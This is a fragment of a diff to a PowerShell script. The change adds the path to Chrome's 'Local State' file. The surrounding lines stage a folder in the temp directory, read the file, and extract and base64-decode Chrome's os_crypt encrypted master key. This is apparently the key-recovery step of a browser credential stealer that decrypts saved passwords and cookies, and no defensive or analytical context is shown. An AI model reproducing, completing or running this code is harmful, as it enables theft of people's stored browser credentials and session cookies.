@@ -29,6 +29,7 @@ $DestinationPath = "$env:TEMP/$FolderName"
 New-Item -Path $DestinationPath -ItemType Directory
 
 Add-Type -AssemblyName System.Security
+$localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
 $jsonData = Get-Content -Path $localStatePath -Raw | ConvertFrom-Json
 $encryptedKeyBase64 = $jsonData.os_crypt.encrypted_key
 $encryptedKey = [System.Convert]::FromBase64String($encryptedKeyBase64)
